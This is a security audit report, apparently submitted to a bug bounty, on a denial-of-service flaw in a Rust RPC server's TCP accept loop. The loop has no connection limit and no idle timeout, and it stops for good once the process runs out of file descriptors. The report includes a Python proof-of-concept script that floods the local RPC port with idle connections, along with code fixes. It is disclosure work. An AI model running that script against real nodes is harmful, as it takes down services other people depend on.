Audit Report

## Title
Unbounded TCP Connection Acceptance in `start_tcp_server` Enables FD Exhaustion DoS — (File: `rpc/src/server.rs`)

## Summary
The `start_tcp_server` function in `rpc/src/server.rs` accepts TCP connections in an unbounded loop with no connection cap, no idle timeout, and a `while let Ok(...)` pattern that permanently exits the accept loop on any error — including `EMFILE` (too many open files). An attacker who can reach the TCP RPC port can open thousands of idle connections, exhaust the process's file-descriptor limit, and permanently halt the TCP RPC accept loop without a process restart.

## Finding Description
The accept loop at lines 174–195 of `rpc/src/server.rs` has three compounding defects confirmed by the actual code:

**1. No connection limit.** [1](#0-0) 
Every `accept()` success immediately calls `tokio::spawn`, creating one unbounded task per connection. There is no semaphore, counter, or backpressure mechanism anywhere in `start_tcp_server`.

**2. No idle timeout.** [2](#0-1) 
Each spawned task calls `serve_stream_sink` directly with no `tokio::time::timeout` wrapper. A client that connects and sends nothing holds the task — and its file descriptor — indefinitely.

**3. Accept loop exits permanently on any error.** [3](#0-2) 
`while let Ok((stream, _)) = listener.accept().await` breaks out of the loop on any `Err`, including `EMFILE`. Once the FD limit is hit, the TCP RPC server stops accepting connections entirely and never recovers without a process restart.

The per-connection `stream_config` with `with_channel_size(4)` and `with_pipeline_size(4)` are pipeline limits scoped to individual connections, not a global connection cap. [4](#0-3) 

Contrast with the HTTP/WS path, which uses `axum::serve` with its own connection management and a `TimeoutLayer` of 30 seconds: [5](#0-4) 

And the P2P layer, which enforces `.max_connection_number(1024)` in `network/src/network.rs`. The TCP RPC server has no equivalent guard.

## Impact Explanation
When TCP RPC is enabled, an attacker exhausting the FD limit causes `listener.accept()` to return `Err(EMFILE)`, the `while let Ok(...)` loop exits permanently, and all subsequent legitimate TCP RPC calls fail with connection refused. The TCP RPC accept loop never recovers without a process restart. This matches the in-scope bounty impact: **"Any local RPC API crash" (0–500 points)**.

## Likelihood Explanation
- TCP RPC is opt-in but a documented production feature (defaulting to `127.0.0.1:18114` when enabled).
- Any local process can trivially reach `127.0.0.1:18114` with no authentication required.
- The default Linux per-process FD limit is 1024 (`ulimit -n`); opening 1024 idle TCP connections requires only a simple script.
- No authentication, rate limiting, or connection cap stands in the way.
- The attack is repeatable: once the loop exits, it stays exited until process restart.

## Recommendation
1. Add a maximum concurrent connection semaphore before spawning:
   ```rust
   let sem = Arc::new(tokio::sync::Semaphore::new(MAX_TCP_RPC_CONNECTIONS));
   // acquire permit before tokio::spawn; drop permit when task ends
   ```
2. Wrap `serve_stream_sink` with `tokio::time::timeout` to close idle connections, mirroring the HTTP server's `TimeoutLayer`.
3. Change the accept loop to handle transient errors (e.g., `EMFILE`) with a brief sleep and retry rather than breaking out permanently:
   ```rust
   loop {
       match listener.accept().await {
           Ok((stream, _)) => { /* spawn */ }
           Err(e) if is_transient(&e) => { tokio::time::sleep(Duration::from_millis(100)).await; }
           Err(_) => break,
       }
   }
   ```

## Proof of Concept
```python
import socket, time

socks = []
for i in range(2000):
    try:
        s = socket.socket()
        s.connect(("127.0.0.1", 18114))
        socks.append(s)
    except Exception as e:
        print(f"Failed at {i}: {e}")
        break

time.sleep(5)
# Now attempt a legitimate RPC call via TCP — connection will be refused
import subprocess
result = subprocess.run(
    ["nc", "127.0.0.1", "18114"],
    input=b'{"id":1,"jsonrpc":"2.0","method":"get_tip_block_number","params":[]}\n',
    capture_output=True, timeout=3
)
print("RPC response:", result.stdout)  # Expected: empty / connection refused
```

After the FD limit is hit, `listener.accept()` returns `Err(EMFILE)`, the `while let Ok(...)` loop at line 176 exits, and no further TCP RPC connections are accepted. [6](#0-5)

### Citations

**File:** rpc/src/server.rs (L125-128)
```rust
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
```

**File:** rpc/src/server.rs (L166-171)
```rust
            let stream_config = StreamServerConfig::default()
                .with_channel_size(4)
                .with_pipeline_size(4)
                .with_shutdown(async move {
                    new_tokio_exit_rx().cancelled().await;
                });
```

**File:** rpc/src/server.rs (L174-195)
```rust
            tokio::select! {
                _ = async {
                        while let Ok((stream, _)) = listener.accept().await {
                            let rpc = Arc::clone(&rpc);
                            let stream_config = stream_config.clone();
                            let codec = codec.clone();
                            tokio::spawn(async move {
                                let (r, w) = stream.into_split();
                                let r = FramedRead::new(r, codec.clone()).map_ok(StreamMsg::Str);
                                let w = FramedWrite::new(w, codec).with(|msg| async move {
                                    Ok::<_, LinesCodecError>(match msg {
                                        StreamMsg::Str(msg) => msg,
                                        _ => "".into(),
                                    })
                                });
                                tokio::pin!(w);
                                if let Err(err) = serve_stream_sink(&rpc, w, r, stream_config).await {
                                    info!("TCP RPCServer error: {:?}", err);
                                }
                            });
                        }
                    } => {},
```
